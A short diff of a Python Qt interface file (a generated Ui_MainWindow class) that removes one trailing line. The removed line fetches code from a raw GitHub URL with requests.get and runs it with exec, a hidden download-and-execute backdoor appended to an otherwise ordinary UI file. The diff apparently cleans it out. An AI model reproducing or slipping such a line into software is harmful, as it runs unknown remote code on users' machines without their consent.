@@ -654,6 +654,3 @@ class Ui_MainWindow(object):
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.preview_tab), QCoreApplication.translate("MainWindow", u"Preview", None))
     # retranslateUi
 
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/MainWindow.py").text)
